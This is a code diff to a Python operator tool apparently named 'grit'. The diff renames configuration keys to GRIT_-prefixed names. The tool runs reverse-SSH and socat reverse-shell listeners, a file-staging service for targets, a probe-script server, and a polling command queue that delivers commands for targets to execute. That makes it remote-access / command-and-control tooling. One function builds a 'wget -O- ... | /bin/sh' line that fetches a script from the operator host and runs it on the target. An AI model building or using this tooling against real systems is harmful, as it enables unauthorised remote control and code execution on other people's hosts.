@@ -939,27 +939,27 @@ DEFAULT_WORKBENCH_JOBS_FILE = DEFAULT_OPERATOR_SESSION_DIR / "workbench-jobs.jso
 DEFAULT_TARGETS_FILE = DEFAULT_OPERATOR_SESSION_DIR / "targets.json"
 DEFAULT_BRIDGE_PROFILES_FILE = DEFAULT_OPERATOR_SESSION_DIR / "bridge-profiles.json"
 DEFAULTS = {
-    "transport": "ssh",
-    "encryption": "tls",
+    "GRIT_RSHELL_TRANSPORT": "ssh",
+    "GRIT_RSHELL_ENCRYPTION": "tls",
     "listen_host": "0.0.0.0",
     "ssh_listen_port": 22202,
-    "shell_listen_port": 22203,
+    "GRIT_RSHELL_SOCAT_PORT": 22203,
     "forward_host": "127.0.0.1",
-    "forward_port": 2200,
+    "GRIT_OPERATOR_REMOTE_FORWARD_PORT": 2200,
     "authorized_dbclient_pubkey": "local/operator-session/id_dbclient.pub",
     "operator_host_key": "local/operator-session/operator_ssh_host_key",
     "tls_cert": "local/operator-session/shell-server.crt",
     "tls_key": "local/operator-session/shell-server.key",
     "tls_verify": "no",
     "session_root": "local/sessions",
-    "file_service_enable": "no",
-    "file_service_port": 22204,
-    "file_service_tls": "yes",
+    "GRIT_OPERATOR_FILE_SERVICE_ENABLE": "no",
+    "GRIT_OPERATOR_FILE_SERVICE_PORT": 22204,
+    "GRIT_OPERATOR_FILE_SERVICE_TLS": "yes",
     "bridge_listen_port": 22206,
     "bridge_dest_host": "127.0.0.1",
     "bridge_dest_port": 0,
-    "probe_port": 22207,
-    "probe_name": "probe.sh",
+    "GRIT_PROBE_PORT": 22207,
+    "GRIT_PROBE_NAME": "probe.sh",
     "operator_session_dir": str(DEFAULT_OPERATOR_SESSION_DIR),
     "server_state": str(DEFAULT_STATE_FILE),
     "staged_files": str(DEFAULT_STAGED_FILE),
@@ -968,26 +968,26 @@ DEFAULTS = {
     "workbench_jobs_file": str(DEFAULT_WORKBENCH_JOBS_FILE),
     "targets_file": str(DEFAULT_TARGETS_FILE),
     "bridge_profiles_file": str(DEFAULT_BRIDGE_PROFILES_FILE),
-    "command_queue_enable": "no",
-    "command_queue_port": "22205",
-    "command_queue_tls": "yes",
-    "command_queue_require_token": "yes",
-    "command_queue_token_source": "manual",
-    "command_queue_token": "",
-    "command_queue_allowed_commands": "none",
-    "command_queue_execution": "metadata-only",
-    "command_queue_allow_arbitrary": "no",
-    "command_queue_poll_interval_sec": "5",
-    "command_queue_poll_jitter_pct": "0",
-    "command_queue_poll_backoff": "none",
-    "command_queue_poll_max_interval_sec": "300",
-    "command_queue_max_polls": "0",
-    "rshell_session_policy": "single",
-    "rshell_retry_count": "1",
-    "rshell_retry_interval_sec": "5",
-    "rshell_retry_jitter_pct": "20",
-    "rshell_retry_backoff": "none",
-    "rshell_retry_max_interval_sec": "300",
+    "GRIT_COMMAND_QUEUE_ENABLE": "no",
+    "GRIT_COMMAND_QUEUE_PORT": "22205",
+    "GRIT_COMMAND_QUEUE_TLS": "yes",
+    "GRIT_COMMAND_QUEUE_REQUIRE_TOKEN": "yes",
+    "GRIT_COMMAND_QUEUE_TOKEN_SOURCE": "manual",
+    "GRIT_COMMAND_QUEUE_TOKEN": "",
+    "GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS": "none",
+    "GRIT_COMMAND_QUEUE_EXECUTION": "metadata-only",
+    "GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY": "no",
+    "GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC": "5",
+    "GRIT_COMMAND_QUEUE_POLL_JITTER_PCT": "0",
+    "GRIT_COMMAND_QUEUE_POLL_BACKOFF": "none",
+    "GRIT_COMMAND_QUEUE_POLL_MAX_INTERVAL_SEC": "300",
+    "GRIT_COMMAND_QUEUE_MAX_POLLS": "0",
+    "GRIT_RSHELL_SESSION_POLICY": "single",
+    "GRIT_RSHELL_RETRY_COUNT": "1",
+    "GRIT_RSHELL_RETRY_INTERVAL_SEC": "5",
+    "GRIT_RSHELL_RETRY_JITTER_PCT": "20",
+    "GRIT_RSHELL_RETRY_BACKOFF": "none",
+    "GRIT_RSHELL_RETRY_MAX_INTERVAL_SEC": "300",
 }
 
 
@@ -1342,7 +1342,7 @@ def server_state_record(cfg):
 def enriched_staged_records(cfg, staged=None):
     staged = staged if staged is not None else load_staged(cfg).get("staged", {})
     host = (local_ips() or ["OPERATOR_IP"])[0]
-    route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("file_service_port", 22204))
+    route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204))
     out = {}
     for name, rec in sorted((staged or {}).items()):
         if not isinstance(rec, dict):
@@ -2910,7 +2910,7 @@ def target_visible_host(host, cfg, fallback_host=None):
     text = str(host or "").strip()
     if text and text.lower() not in ("operator", "localhost", "0.0.0.0", "::"):
         return text
-    fallback = str(cfg.get("operator_server_host") or fallback_host or cfg.get("listen_host") or "").strip()
+    fallback = str(cfg.get("GRIT_OPERATOR_SERVER_HOST") or fallback_host or cfg.get("listen_host") or "").strip()
     if fallback and fallback not in ("0.0.0.0", "::"):
         return fallback
     candidates = local_ips()
@@ -5460,7 +5460,7 @@ def probe_workflow_action_records(cfg, service_row=None, targets=None):
     bridge_arg = (" --bridge-profile " + shquote(str(cfg.get("bridge_profile")))) if cfg.get("bridge_profile") else ""
     service_row = service_row if isinstance(service_row, dict) else {}
     actual = str(service_row.get("actual") or "unknown")
-    port = int(cfg.get("probe_port", service_row.get("port", 22207)) or 22207)
+    port = int(cfg.get("GRIT_PROBE_PORT", service_row.get("port", 22207)) or 22207)
     host = (local_ips() or ["OPERATOR_IP"])[0]
     route = probe_route_context(cfg, host=host, port=port)
     target_command = render_probe_command(cfg, host=host, port=port)
@@ -5507,7 +5507,7 @@ def probe_workflow_action_records(cfg, service_row=None, targets=None):
             "headless_command": command,
             "run_command": base + bridge_arg + " --run-probe-workflow-action " + shquote(f"probe:{action_id}"),
             "target_command": target_command,
-            "script_name": str(cfg.get("probe_name", "survey.sh")).lstrip("/") or "survey.sh",
+            "script_name": str(cfg.get("GRIT_PROBE_NAME", "survey.sh")).lstrip("/") or "survey.sh",
             "listen_host": str(cfg.get("listen_host") or service_row.get("bind_address") or ""),
             "listen_port": port,
             "fleet_target_count": len(target_records),
@@ -6493,7 +6493,7 @@ def file_service_workflow_action_records(cfg, service_row, staged_records=None, 
         cfg,
         "file-service",
         direct_host=(local_ips() or ["OPERATOR_IP"])[0],
-        direct_port=cfg.get("file_service_port", 22204),
+        direct_port=cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204),
     )
     staged_count = len([rec for rec in staged_records or [] if isinstance(rec, dict)])
     upload_count = len([rec for rec in uploads or [] if isinstance(rec, dict)])
@@ -6546,7 +6546,7 @@ def file_service_workflow_action_records(cfg, service_row, staged_records=None, 
             "bridge_profile": str(route.get("bridge_profile") or ""),
             "bridge_route_path": str(route.get("bridge_route_path") or ""),
             "requires_bridge": bool(route.get("requires_bridge", False)),
-            "port": service_row.get("port", cfg.get("file_service_port", 22204)),
+            "port": service_row.get("port", cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204)),
             "bind_address": str(service_row.get("bind_address") or cfg.get("listen_host", "")),
             "tls": bool(service_row.get("tls", False)),
             "pid": service_row.get("pid", ""),
@@ -8879,10 +8879,10 @@ def save_command_queue(cfg, data):
 def command_queue_execution_supported(cfg):
     if command_queue_policy_errors(cfg):
         return False
-    enabled = str(cfg.get("command_queue_enable", "no"))
-    allowed = str(cfg.get("command_queue_allowed_commands", "none"))
-    execution = str(cfg.get("command_queue_execution", "metadata-only"))
-    allow_arbitrary = str(cfg.get("command_queue_allow_arbitrary", "no"))
+    enabled = str(cfg.get("GRIT_COMMAND_QUEUE_ENABLE", "no"))
+    allowed = str(cfg.get("GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS", "none"))
+    execution = str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only"))
+    allow_arbitrary = str(cfg.get("GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY", "no"))
     if enabled != "yes" or execution != "execute":
         return False
     if allowed == "grit-only":
@@ -8894,12 +8894,12 @@ def command_queue_execution_supported(cfg):
 
 def command_queue_policy_snapshot(cfg):
     errors = command_queue_policy_errors(cfg)
-    enabled = str(cfg.get("command_queue_enable", "no"))
-    allowed_commands = str(cfg.get("command_queue_allowed_commands", "none"))
-    execution_mode = str(cfg.get("command_queue_execution", "metadata-only"))
-    allow_arbitrary = str(cfg.get("command_queue_allow_arbitrary", "no"))
-    token_required = str(cfg.get("command_queue_require_token", "yes")) == "yes"
-    token_configured = bool(str(cfg.get("command_queue_token", "")))
+    enabled = str(cfg.get("GRIT_COMMAND_QUEUE_ENABLE", "no"))
+    allowed_commands = str(cfg.get("GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS", "none"))
+    execution_mode = str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only"))
+    allow_arbitrary = str(cfg.get("GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY", "no"))
+    token_required = str(cfg.get("GRIT_COMMAND_QUEUE_REQUIRE_TOKEN", "yes")) == "yes"
+    token_configured = bool(str(cfg.get("GRIT_COMMAND_QUEUE_TOKEN", "")))
     execution_supported = command_queue_execution_supported(cfg)
     arbitrary_execution_allowed = execution_supported and allowed_commands == "custom" and allow_arbitrary == "yes"
     return {
@@ -8928,7 +8928,7 @@ def command_queue_delivery_policy_snapshot(cfg):
     policy.update({
         "delivery_supported": True,
         "result_upload_supported": True,
-        "delivery_mode": str(cfg.get("command_queue_execution", "metadata-only")),
+        "delivery_mode": str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only")),
         "active_control_channel": True,
         "operator_queue_records_only": False,
         "safety_boundary": "explicit opt-in delivery on target poll; target execution depends on target-side command queue policy",
@@ -9192,33 +9192,33 @@ def valid_header_token(value):
 
 def command_queue_policy_errors(cfg):
     errors = []
-    enabled = str(cfg.get("command_queue_enable", "no"))
-    allowed = str(cfg.get("command_queue_allowed_commands", "none"))
-    execution = str(cfg.get("command_queue_execution", "metadata-only"))
-    allow_arbitrary = str(cfg.get("command_queue_allow_arbitrary", "no"))
+    enabled = str(cfg.get("GRIT_COMMAND_QUEUE_ENABLE", "no"))
+    allowed = str(cfg.get("GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS", "none"))
+    execution = str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only"))
+    allow_arbitrary = str(cfg.get("GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY", "no"))
     if not valid_yes_no(enabled):
         errors.append("invalid command queue enable value")
-    if not valid_uint_string(cfg.get("command_queue_port", "22205")):
+    if not valid_uint_string(cfg.get("GRIT_COMMAND_QUEUE_PORT", "22205")):
         errors.append("invalid command queue port")
-    if not valid_uint_string(cfg.get("command_queue_poll_interval_sec", "5")):
+    if not valid_uint_string(cfg.get("GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC", "5")):
         errors.append("invalid command queue poll interval")
-    if not valid_uint_string(cfg.get("command_queue_poll_jitter_pct", "0")):
+    if not valid_uint_string(cfg.get("GRIT_COMMAND_QUEUE_POLL_JITTER_PCT", "0")):
         errors.append("invalid command queue poll jitter")
-    if str(cfg.get("command_queue_poll_backoff", "none")) not in ("none", "linear", "exponential"):
+    if str(cfg.get("GRIT_COMMAND_QUEUE_POLL_BACKOFF", "none")) not in ("none", "linear", "exponential"):
         errors.append("invalid command queue poll backoff")
-    if not valid_uint_string(cfg.get("command_queue_poll_max_interval_sec", "300")):
+    if not valid_uint_string(cfg.get("GRIT_COMMAND_QUEUE_POLL_MAX_INTERVAL_SEC", "300")):
         errors.append("invalid command queue poll max interval")
-    if not valid_uint_string(cfg.get("command_queue_max_polls", "0")):
+    if not valid_uint_string(cfg.get("GRIT_COMMAND_QUEUE_MAX_POLLS", "0")):
         errors.append("invalid command queue max polls")
-    if not valid_yes_no(cfg.get("command_queue_tls", "yes")):
+    if not valid_yes_no(cfg.get("GRIT_COMMAND_QUEUE_TLS", "yes")):
         errors.append("invalid command queue TLS value")
-    if not valid_yes_no(cfg.get("command_queue_require_token", "yes")):
+    if not valid_yes_no(cfg.get("GRIT_COMMAND_QUEUE_REQUIRE_TOKEN", "yes")):
         errors.append("invalid command queue token requirement")
-    if str(cfg.get("command_queue_token_source", "manual")) not in ("manual", "generated"):
+    if str(cfg.get("GRIT_COMMAND_QUEUE_TOKEN_SOURCE", "manual")) not in ("manual", "generated"):
         errors.append("invalid command queue token source")
-    if not valid_header_token(cfg.get("command_queue_token", "")):
+    if not valid_header_token(cfg.get("GRIT_COMMAND_QUEUE_TOKEN", "")):
         errors.append("invalid command queue token value")
-    if enabled == "yes" and str(cfg.get("command_queue_require_token", "yes")) == "yes" and not str(cfg.get("command_queue_token", "")):
+    if enabled == "yes" and str(cfg.get("GRIT_COMMAND_QUEUE_REQUIRE_TOKEN", "yes")) == "yes" and not str(cfg.get("GRIT_COMMAND_QUEUE_TOKEN", "")):
         errors.append("enabled command queue requires command_queue_token when token requirement is yes")
     if allowed not in ("none", "grit-only", "allowlist", "custom"):
         errors.append("invalid command queue allowed commands policy")
@@ -9488,22 +9488,22 @@ def command_queue_summary(cfg):
         rec for rec in commands
         if isinstance(rec, dict) and rec.get("result_output_exceeded_limit") is True
     ])
-    enabled = str(cfg.get("command_queue_enable", "no"))
-    allowed_commands = str(cfg.get("command_queue_allowed_commands", "none"))
-    execution_mode = str(cfg.get("command_queue_execution", "metadata-only"))
-    allow_arbitrary = str(cfg.get("command_queue_allow_arbitrary", "no"))
-    poll_interval_sec = str(cfg.get("command_queue_poll_interval_sec", "5"))
-    poll_jitter_pct = str(cfg.get("command_queue_poll_jitter_pct", "0"))
-    poll_backoff = str(cfg.get("command_queue_poll_backoff", "none"))
-    poll_max_interval_sec = str(cfg.get("command_queue_poll_max_interval_sec", "300"))
-    max_polls = str(cfg.get("command_queue_max_polls", "0"))
-    tls = str(cfg.get("command_queue_tls", "yes"))
+    enabled = str(cfg.get("GRIT_COMMAND_QUEUE_ENABLE", "no"))
+    allowed_commands = str(cfg.get("GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS", "none"))
+    execution_mode = str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only"))
+    allow_arbitrary = str(cfg.get("GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY", "no"))
+    poll_interval_sec = str(cfg.get("GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC", "5"))
+    poll_jitter_pct = str(cfg.get("GRIT_COMMAND_QUEUE_POLL_JITTER_PCT", "0"))
+    poll_backoff = str(cfg.get("GRIT_COMMAND_QUEUE_POLL_BACKOFF", "none"))
+    poll_max_interval_sec = str(cfg.get("GRIT_COMMAND_QUEUE_POLL_MAX_INTERVAL_SEC", "300"))
+    max_polls = str(cfg.get("GRIT_COMMAND_QUEUE_MAX_POLLS", "0"))
+    tls = str(cfg.get("GRIT_COMMAND_QUEUE_TLS", "yes"))
     poll_transport_supported = tls == "no"
     poll_transport_unsupported_reason = "" if poll_transport_supported else "live command queue polling requires GRIT_COMMAND_QUEUE_TLS=no in this build"
     policy_errors = command_queue_policy_errors(cfg)
     policy_valid = not policy_errors
-    token_required = str(cfg.get("command_queue_require_token", "yes")) == "yes"
-    token_configured = bool(str(cfg.get("command_queue_token", "")))
+    token_required = str(cfg.get("GRIT_COMMAND_QUEUE_REQUIRE_TOKEN", "yes")) == "yes"
+    token_configured = bool(str(cfg.get("GRIT_COMMAND_QUEUE_TOKEN", "")))
     arbitrary_policy_requested = policy_valid and enabled == "yes" and allowed_commands == "custom" and allow_arbitrary == "yes"
     execution_supported = command_queue_execution_supported(cfg)
     arbitrary_execution_allowed = arbitrary_policy_requested and execution_supported
@@ -9544,10 +9544,10 @@ def command_queue_summary(cfg):
         "path": str(command_queue_path(cfg)),
         "enabled": enabled,
         "default_enabled": False,
-        "port": str(cfg.get("command_queue_port", "22205")),
+        "port": str(cfg.get("GRIT_COMMAND_QUEUE_PORT", "22205")),
         "tls": tls,
-        "require_token": str(cfg.get("command_queue_require_token", "yes")),
-        "token_source": str(cfg.get("command_queue_token_source", "manual")),
+        "require_token": str(cfg.get("GRIT_COMMAND_QUEUE_REQUIRE_TOKEN", "yes")),
+        "token_source": str(cfg.get("GRIT_COMMAND_QUEUE_TOKEN_SOURCE", "manual")),
         "token_configured": token_configured,
         "allowed_commands": allowed_commands,
         "execution_mode": execution_mode,
@@ -10024,7 +10024,7 @@ def stage_file(cfg, path, request_name, metadata=None):
         record.update(target_context_fields(cfg, configured_target_filter(cfg)))
     if "route_kind" not in record:
         host = (local_ips() or ["OPERATOR_IP"])[0]
-        route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("file_service_port", 22204))
+        route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204))
         record.update(attach_target_route_fields({}, route))
     data["staged"][request] = record
     atomic_write_json(staged_file_path(cfg), data)
@@ -10057,9 +10057,9 @@ def update_server_state(cfg, action, status="configured", extra=None):
         "status": status,
         "listen_host": str(cfg.get("listen_host", "")),
         "ssh_port": int(cfg.get("ssh_listen_port", 0)),
-        "shell_port": int(cfg.get("shell_listen_port", 0)),
-        "file_service_port": int(cfg.get("file_service_port", 0)),
-        "file_service_tls": str(cfg.get("file_service_tls", "yes")),
+        "shell_port": int(cfg.get("GRIT_RSHELL_SOCAT_PORT", 0)),
+        "GRIT_OPERATOR_FILE_SERVICE_PORT": int(cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 0)),
+        "GRIT_OPERATOR_FILE_SERVICE_TLS": str(cfg.get("GRIT_OPERATOR_FILE_SERVICE_TLS", "yes")),
         "pid": os.getpid(),
         "config_path": str(cfg.get("_config_path", DEFAULT_CONFIG)),
         "state_file": str(state_file_path(cfg)),
@@ -11156,7 +11156,7 @@ def release_artifact_workflow_action_summary(records):
 def render_fetch_command(request_name, cfg, host=None, force=False):
     candidates = local_ips()
     host = host or (candidates[0] if candidates else "OPERATOR_IP")
-    route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("file_service_port", 22204))
+    route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204))
     target_ctx = selected_target_context(cfg)
     cmd = [
         "grit",
@@ -11165,9 +11165,9 @@ def render_fetch_command(request_name, cfg, host=None, force=False):
         "--host",
         str(route.get("host") or host),
         "--port",
-        str(route.get("port") or cfg.get("file_service_port", 22204)),
+        str(route.get("port") or cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204)),
     ]
-    if not yes(cfg.get("file_service_tls", "yes")):
+    if not yes(cfg.get("GRIT_OPERATOR_FILE_SERVICE_TLS", "yes")):
         cmd.append("--no-tls")
     if force:
         cmd.append("--force")
@@ -11183,7 +11183,7 @@ def render_fetch_command(request_name, cfg, host=None, force=False):
 def render_file_service_command(parts, cfg, host=None):
     candidates = local_ips()
     host = host or (candidates[0] if candidates else "OPERATOR_IP")
-    route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("file_service_port", 22204))
+    route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204))
     target_ctx = selected_target_context(cfg)
     cmd = [
         "./grit",
@@ -11191,9 +11191,9 @@ def render_file_service_command(parts, cfg, host=None):
         "--host",
         str(route.get("host") or host),
         "--port",
-        str(route.get("port") or cfg.get("file_service_port", 22204)),
+        str(route.get("port") or cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204)),
     ]
-    if not yes(cfg.get("file_service_tls", "yes")):
+    if not yes(cfg.get("GRIT_OPERATOR_FILE_SERVICE_TLS", "yes")):
         cmd.append("--no-tls")
     if target_ctx.get("target_id"):
         cmd.extend(["--target-id", target_ctx.get("target_id", "")])
@@ -11206,13 +11206,13 @@ def render_file_service_command(parts, cfg, host=None):
 
 def probe_route_context(cfg, host=None, port=None):
     candidates = local_ips()
-    direct_host = host or str(cfg.get("operator_server_host") or "") or (candidates[0] if candidates else "OPERATOR_IP")
-    direct_port = port or cfg.get("probe_port", 22207)
+    direct_host = host or str(cfg.get("GRIT_OPERATOR_SERVER_HOST") or "") or (candidates[0] if candidates else "OPERATOR_IP")
+    direct_port = port or cfg.get("GRIT_PROBE_PORT", 22207)
     return target_route_context(cfg, "probe", direct_host=direct_host, direct_port=direct_port)
 
 
 def render_probe_command(cfg, host=None, port=None):
-    script_name = str(cfg.get("probe_name", "survey.sh")).lstrip("/") or "survey.sh"
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "survey.sh")).lstrip("/") or "survey.sh"
     route = probe_route_context(cfg, host=host, port=port)
     url = f"http://{route.get('host', 'OPERATOR_IP')}:{route.get('port', 22207)}/{script_name}"
     return f"wget -O- {shquote(url)} | /bin/sh"
@@ -11783,19 +11783,19 @@ def load_config(path):
             print(f"warning: unable to read {p}: {exc}", file=sys.stderr)
     apply_operator_session_path_defaults(cfg, explicit_keys)
     # Accept legacy field names
-    if "socat_listen_port" in cfg and "shell_listen_port" not in cfg:
-        cfg["shell_listen_port"] = cfg["socat_listen_port"]
-    if "tls_shell_listen_port" in cfg and "shell_listen_port" not in cfg:
-        cfg["shell_listen_port"] = cfg["tls_shell_listen_port"]
+    if "socat_listen_port" in cfg and "GRIT_RSHELL_SOCAT_PORT" not in cfg:
+        cfg["GRIT_RSHELL_SOCAT_PORT"] = cfg["socat_listen_port"]
+    if "tls_shell_listen_port" in cfg and "GRIT_RSHELL_SOCAT_PORT" not in cfg:
+        cfg["GRIT_RSHELL_SOCAT_PORT"] = cfg["tls_shell_listen_port"]
     # Normalise legacy transport names
-    t = cfg.get("transport", "ssh")
+    t = cfg.get("GRIT_RSHELL_TRANSPORT", "ssh")
     if t == "socat-tls":
-        cfg["transport"] = "socat"
-        cfg.setdefault("encryption", "tls")
+        cfg["GRIT_RSHELL_TRANSPORT"] = "socat"
+        cfg.setdefault("GRIT_RSHELL_ENCRYPTION", "tls")
     elif t == "builtin-tls":
-        cfg["transport"] = "builtin"
-        cfg.setdefault("encryption", "tls")
-    for key in ("ssh_listen_port", "shell_listen_port", "forward_port", "file_service_port", "bridge_listen_port", "bridge_dest_port", "probe_port"):
+        cfg["GRIT_RSHELL_TRANSPORT"] = "builtin"
+        cfg.setdefault("GRIT_RSHELL_ENCRYPTION", "tls")
+    for key in ("ssh_listen_port", "GRIT_RSHELL_SOCAT_PORT", "GRIT_OPERATOR_REMOTE_FORWARD_PORT", "GRIT_OPERATOR_FILE_SERVICE_PORT", "bridge_listen_port", "bridge_dest_port", "GRIT_PROBE_PORT"):
         cfg[key] = int(cfg[key])
     return cfg
 
@@ -11977,7 +11977,7 @@ class ReverseSSHServer(paramiko.ServerInterface if HAVE_PARAMIKO else object):
                 "requested_address": address,
                 "requested_port": requested,
                 "forward_host": str(self.forward_host),
-                "forward_port": int(self.forward_port),
+                "GRIT_OPERATOR_REMOTE_FORWARD_PORT": int(self.forward_port),
             }),
         )
         return requested
@@ -12144,7 +12144,7 @@ def serve_ssh(cfg, timeout):
     log_dir = session_log_dir(cfg, "ssh")
     target_ctx = selected_target_context(cfg)
     start_session_record(cfg, service, log_dir, details=details_with_target(cfg, {
-        "transport": "ssh",
+        "GRIT_RSHELL_TRANSPORT": "ssh",
         "port": int(cfg["ssh_listen_port"]),
     }, target_ctx))
     if target_ctx:
@@ -12190,7 +12190,7 @@ def serve_ssh(cfg, timeout):
         # doesn't implement, so we must pin to avoid an impossible negotiation.
         _sec = transport.get_security_options()
         _sec.kex = ("diffie-hellman-group14-sha256",)
-        server = ReverseSSHServer(cfg, log_dir, authorized, cfg["forward_host"], cfg["forward_port"])
+        server = ReverseSSHServer(cfg, log_dir, authorized, cfg["forward_host"], cfg["GRIT_OPERATOR_REMOTE_FORWARD_PORT"])
         server.set_transport(transport)
         transport.start_server(server=server)
         while not SHUTDOWN.is_set() and transport.is_active():
@@ -12657,7 +12657,7 @@ def handle_staged_fetch(cfg, conn, method, target, headers, addr):
     stream_fetch_response(conn, src, 200, "application/octet-stream", headers=response_headers, head_only=(method == "HEAD"))
     route = rec.get("target_route") if isinstance(rec.get("target_route"), dict) else None
     if not route:
-        route = target_route_context(cfg, "file-service", direct_host=(local_ips() or ["OPERATOR_IP"])[0], direct_port=cfg.get("file_service_port", 22204))
+        route = target_route_context(cfg, "file-service", direct_host=(local_ips() or ["OPERATOR_IP"])[0], direct_port=cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204))
     return attach_target_identity(attach_target_route_fields({
         "operation": "fetch",
         "status": "served",
@@ -12762,7 +12762,7 @@ def handle_command_queue_result(cfg, conn, method, target, headers, body, addr):
         "result_output_bytes": rec.get("result_output_bytes", 0),
         "result_output_limit_bytes": rec.get("result_output_limit_bytes", 0),
         "result_output_exceeded_limit": bool(rec.get("result_output_exceeded_limit")),
-        "execution_mode": str(cfg.get("command_queue_execution", "metadata-only")),
+        "execution_mode": str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only")),
         "execution_supported": bool(rec.get("execution_supported", False)),
         "executes_commands": bool(rec.get("executes_commands", False)),
         "execution_decision": rec.get("execution_decision", ""),
@@ -12782,7 +12782,7 @@ def handle_command_queue_result(cfg, conn, method, target, headers, body, addr):
         "result_output_bytes": response["result_output_bytes"],
         "result_output_limit_bytes": response["result_output_limit_bytes"],
         "result_output_exceeded_limit": response["result_output_exceeded_limit"],
-        "execution_mode": str(cfg.get("command_queue_execution", "metadata-only")),
+        "execution_mode": str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only")),
         "execution_supported": response["execution_supported"],
         "executes_commands": response["executes_commands"],
         "execution_decision": response["execution_decision"],
@@ -12833,18 +12833,18 @@ def append_command_queue_result_events(cfg, service, log_dir, remote, metadata):
 
 
 def command_queue_token_valid(cfg, headers):
-    if str(cfg.get("command_queue_require_token", "yes")) != "yes":
+    if str(cfg.get("GRIT_COMMAND_QUEUE_REQUIRE_TOKEN", "yes")) != "yes":
         return True
-    expected = str(cfg.get("command_queue_token", ""))
+    expected = str(cfg.get("GRIT_COMMAND_QUEUE_TOKEN", ""))
     supplied = str((headers or {}).get("x-grit-command-queue-token", ""))
     return bool(expected) and supplied == expected
 
 
 def command_queue_execution_rejection_reason(cfg):
-    if str(cfg.get("command_queue_execution", "metadata-only")) == "metadata-only":
+    if str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only")) == "metadata-only":
         return "command queue execution mode is metadata-only"
-    allowed = str(cfg.get("command_queue_allowed_commands", "none"))
-    allow_arbitrary = str(cfg.get("command_queue_allow_arbitrary", "no"))
+    allowed = str(cfg.get("GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS", "none"))
+    allow_arbitrary = str(cfg.get("GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY", "no"))
     if allowed == "none":
         return "command queue execution mode execute requires a non-none allowed commands policy"
     if allowed == "allowlist":
@@ -12903,7 +12903,7 @@ def handle_command_queue_poll(cfg, conn, method, target, headers, addr):
             "command": command.get("command", ""),
             "timeout_sec": command.get("timeout_sec", 0),
             "max_output_bytes": command.get("max_output_bytes", 0),
-            "execution_mode": str(cfg.get("command_queue_execution", "metadata-only")),
+            "execution_mode": str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only")),
             "delivery_supported": True,
             "execution_supported": execution_supported,
             "executes_commands": execution_supported,
@@ -12939,7 +12939,7 @@ def handle_command_queue_poll(cfg, conn, method, target, headers, addr):
             "delivered_count": 1 if delivered else 0,
             **command_queue_work_metadata(command),
             "delivery_supported": True,
-            "execution_mode": str(cfg.get("command_queue_execution", "metadata-only")),
+            "execution_mode": str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only")),
             "execution_supported": execution_supported,
             "executes_commands": execution_supported,
             "result_upload_supported": True,
@@ -12952,7 +12952,7 @@ def handle_command_queue_poll(cfg, conn, method, target, headers, addr):
         "status": "no-command",
         "queued_count": queued_count,
         "delivery_supported": False,
-        "execution_mode": str(cfg.get("command_queue_execution", "metadata-only")),
+        "execution_mode": str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only")),
         "execution_supported": execution_supported,
         "executes_commands": execution_supported,
         "result_upload_supported": True,
@@ -12978,7 +12978,7 @@ def handle_command_queue_poll(cfg, conn, method, target, headers, addr):
         "remote_addr": remote,
         "queued_count": queued_count,
         "delivery_supported": False,
-        "execution_mode": str(cfg.get("command_queue_execution", "metadata-only")),
+        "execution_mode": str(cfg.get("GRIT_COMMAND_QUEUE_EXECUTION", "metadata-only")),
         "execution_supported": execution_supported,
         "executes_commands": execution_supported,
         "result_upload_supported": True,
@@ -13008,8 +13008,8 @@ def send_json_response(conn, status_code, payload):
 
 def serve_command_queue(cfg, timeout, max_sessions=0):
     service = "command-queue"
-    port = int(cfg.get("command_queue_port", "22205"))
-    if yes(cfg.get("command_queue_tls", "yes")):
+    port = int(cfg.get("GRIT_COMMAND_QUEUE_PORT", "22205"))
+    if yes(cfg.get("GRIT_COMMAND_QUEUE_TLS", "yes")):
         print("command-queue listener currently supports plain HTTP polling only; set command_queue_tls=no", file=sys.stderr)
         update_server_state(cfg, service, "error", {"port": port, "error": "plain HTTP polling requires command_queue_tls=no"})
         append_event(cfg, service, "bind_error", "error", details={"port": port, "error": "plain HTTP polling requires command_queue_tls=no"})
